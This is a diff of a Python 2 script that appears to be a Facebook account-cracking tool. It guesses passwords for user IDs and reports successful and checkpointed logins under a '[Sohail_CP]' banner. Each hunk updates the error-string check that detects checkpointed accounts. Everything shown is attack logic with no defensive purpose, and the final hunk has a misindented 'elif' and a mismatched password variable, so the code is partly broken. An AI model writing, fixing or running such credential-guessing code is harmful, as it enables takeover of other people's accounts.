@@ -280,7 +280,7 @@ def action():
 
                 oks.append(c + user + pass1)
 
-            elif 'm.facebook.com' in q['error_msg']:
+            elif 'www.facebook.com' in q['error_msg']:
 
                 print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass1
 
@@ -312,7 +312,7 @@ def action():
 
                     oks.append(c + user + pass2)
 
-                elif 'm.facebook.com' in q['error_msg']:
+                elif 'www.facebook.com' in q['error_msg']:
 
                     print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass2
 
@@ -344,7 +344,7 @@ def action():
 
                         oks.append(c + user + pass3)
 
-                    elif 'm.facebook.com' in q['error_msg']:
+                    elif 'www.facebook.com' in q['error_msg']:
 
                         print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass3
 
@@ -376,7 +376,7 @@ def action():
 
                         oks.append(c + user + pass3)
 
-                       elif 'm.facebook.com' in q['error_msg']:
+                       elif 'www.facebook.com' in q['error_msg']:
 
                         print '\x1b[1;97m  [Sohail_CP] ' + k + c + user + '  |  ' + pass4
 
